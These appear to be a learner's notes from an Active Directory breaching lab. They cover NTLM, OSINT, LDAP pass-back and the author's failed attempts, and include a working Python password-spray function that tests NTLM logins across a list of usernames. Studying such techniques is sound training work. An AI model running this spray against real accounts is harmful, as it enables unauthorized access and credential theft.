- AD - 90% of fortune 1000 companies
- Common- Open Source Intelligence (OSINT) (github,stackoverflow,past breaches) and Phishing
- New Technology LAN Manager (NTLM) is the suite of security protocols used to authenticate users' identities in AD
- test credentials using RDP, outlook, vpn, 
- brute force triggers alerts
Here is a simple script that does a password spray:
```
def password_spray(self, password, url):
    print ("[*] Starting passwords spray attack using the following password: " + password)
    #Reset valid credential counter
    count = 0
    #Iterate through all of the possible usernames
    for user in self.users:
        #Make a request to the website and attempt Windows Authentication
        response = requests.get(url, auth=HttpNtlmAuth(self.fqdn + "\\" + user, password))
        #Read status code of response to determine if authentication was successful
        if (response.status_code == self.HTTP_AUTH_SUCCEED_CODE):
            print ("[+] Valid credential pair found! Username: " + user + " Password: " + password)
            count += 1
            continue
        if (self.verbose):
            if (response.status_code == self.HTTP_AUTH_FAILED_CODE):
                print ("[-] Failed login with Username: " + user)
    print ("[*] Password spray attack completed, " + str(count) + " valid credential pairs found")
```
- LDAP services: printers, VPN, 
- NTLM vs LDAP: LDAP directly verifies users creds
- LDAP contains AD creds which can be recovered in config files (plain text)
- LDAP Pass-back- configure ip of ldap so printer sends request to rogue server to collect creds

- Does not work so we need to create ldap server to downgrade security. Unfortunately it did not work on kali so I did it in the attackbox:

- no luckâ€¦ (other people on the forum were also having problems)
